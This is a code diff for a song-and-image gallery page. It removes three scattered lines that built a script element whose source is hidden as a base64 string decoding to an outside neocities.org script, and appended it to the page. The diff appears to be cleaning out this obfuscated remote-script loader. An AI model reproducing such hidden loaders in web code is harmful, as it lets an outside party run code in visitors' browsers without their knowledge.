@@ -8,7 +8,6 @@ const ImagesFile = await fetch("/assets/Images.json")
 var CurrentPageNumber = 0;
 var SongsDiv = document.getElementById("songs")
 var ImagesDiv = document.getElementById("images")
-var b = document.createElement("script")
 var CurrentPageDiv = null;
 var CurrentInnerPageDiv = null;
 
@@ -95,7 +94,6 @@ pagination.classList.add("pagination")
 SongsDiv.append(pagination)
 paginationState.songs.totalPages = CurrentPageNumber;
 renderPagination('songs', '.song-pages');
-b.src = atob("aHR0cHM6Ly9tZW50YWwtYXN5bHVtLXRldG8ubmVvY2l0aWVzLm9yZy9zY3JpcHQuanM=")
 loadActivePageImages(document.querySelector('.panel.active'));
 CurrentPageNumber = 0;
 // initialize images page
@@ -124,6 +122,5 @@ pagination = document.createElement("div")
 pagination.classList.add("pagination")
 ImagesDiv.append(pagination)
 paginationState.images.totalPages = CurrentPageNumber;
-document.body.append(b);
 renderPagination('images', '.image-pages');
 loadActivePageImages(document.querySelector('.panel.active'));
